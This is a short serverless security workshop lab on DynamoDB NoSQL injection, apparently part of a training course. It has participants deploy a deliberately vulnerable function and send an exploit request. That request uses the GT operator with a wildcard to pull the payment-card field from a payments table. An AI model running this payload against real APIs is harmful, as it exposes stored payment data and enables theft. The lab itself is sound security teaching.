# DynamoDB Injection

This attack/payload has been documented [here](https://medium.com/appsecengineer/dynamodb-injection-1db99c2454ac) article.

On reading, you'll see that its a NoSQL Injection attack that's predicated on using the `gt` operator. One of the main reasons that this attack is made possible, is because of badly configured IAM privileges

* In your image, navigate over to `/root/labs/Serverless-Workshop/DynamoDB-Injection`
* Wait for instructor to explain the contents of the lab
* Let's look at the contents of the `serverless.yml` [here](https://github.com/we45/Serverless-Workshop/blob/master/DynamoDB-Injection/serverless.yml)
* Deploy the function with the command `sls deploy`
* Wait for the function to deploy completely 

Let's now run a genuine search against the database with this command
```bash

http POST https://xxxx.execute-api.us-east-1.amazonaws.com/api/search db=we45-sls-users search_term=Mark search_operator=EQ search_field=first_name

```

Now let's run the exploit
```bash

http POST https://xxxx.execute-api.us-east-1.amazonaws.com/api/search db=we45-sls-payments search_term="*" search_operator=GT search_field=payment-card

```